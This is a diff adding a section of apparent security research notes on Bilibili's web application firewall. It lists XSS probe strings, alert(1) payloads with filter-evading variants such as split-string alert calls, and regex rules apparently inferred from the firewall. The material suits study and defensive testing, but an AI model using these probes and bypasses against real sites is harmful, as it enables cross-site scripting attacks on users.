@@ -531,9 +531,45 @@ FLAG{Rediswithout authentication is easy to exploit}
 
 
 
+# 0x04 B站waf
 
+xss探针
 
+```javascript
+';`"><aaa bbb=ccc>ddd<aaa/>
+aaa</script>bbb<script>ccc
+```
 
+payload
+
+```javascript
+<img src=x onerror=alert(1)>
+<script>alert(1)<script>
+top['alert'](1)
+top['al'+'ert'](1)
+```
+
+至今已发现的b站waf规则总结：
+
+```javascript
+on\w+=(?:prompt|alert|confirm){1}\(\w+\)
+
+<[^>]*\s+on\w+=(?:prompt|alert|confirm){1}\(\w+  
+
+<script>[^`]*document\[\w+\]
+
+<script>[^`]*document\.\w+
+
+<script>\w+\.cookie
+
+<script\s(.*\s)?src(=\w+)?>
+
+<a\s(.*\s)?href=javascript:.*>
+
+<img\s[^>]*on\w+=\w+\[\w*\]\(\w*\)
+
+<img\s[^>]*on\w+=`\w*`.*
+```
 
 
 
